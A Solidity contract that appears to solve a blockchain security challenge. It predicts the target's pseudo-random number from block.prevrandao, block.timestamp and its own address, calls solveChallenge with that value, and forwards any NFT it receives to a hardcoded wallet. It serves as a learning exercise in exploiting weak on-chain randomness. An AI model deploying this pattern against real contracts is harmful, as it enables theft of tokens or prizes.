// SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;

import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract Hacker is ERC721, IERC721Receiver {
    error Challenge__HackFailed();

    uint256[] private receivedTokens;

    constructor() ERC721("Hacker", "HAC") {}

    address private constant NFT_ADDRESS = 0x76B50696B8EFFCA6Ee6Da7F6471110F334536321;
    address private constant TARGET = 0x33e1fD270599188BB1489a169dF1f0be08b83509;
    address private constant HACKER = 0x50e2a33B9E04e78bF1F1d1F94b0be95Be63C23e7;
    string private constant ATTACKER = "nseen18";

    function hackNFT() external returns (bytes4, bool) {
        uint256 notReallyRandom = uint256(keccak256(abi.encodePacked(address(this), block.prevrandao, block.timestamp))) % 100000;

        (bool success, bytes memory returnData) = TARGET.call(abi.encodeWithSignature("solveChallenge(uint256,string)", notReallyRandom, ATTACKER));
        if (!success) revert Challenge__HackFailed();

        return (bytes4(returnData), success);
    }

    function onERC721Received(address /* operator */, address /* from */, uint256 tokenId, bytes memory /* data */) public override returns (bytes4) {
        receivedTokens.push(tokenId);

        /** @dev We have to use correct contract interface to have access to proper transfer function designed for only that contract NFT's */
        IERC721(NFT_ADDRESS).transferFrom(address(this), HACKER, tokenId);

        return this.onERC721Received.selector;
    }

    function getTokens() public view returns (uint256[] memory) {
        return receivedTokens;
    }
}
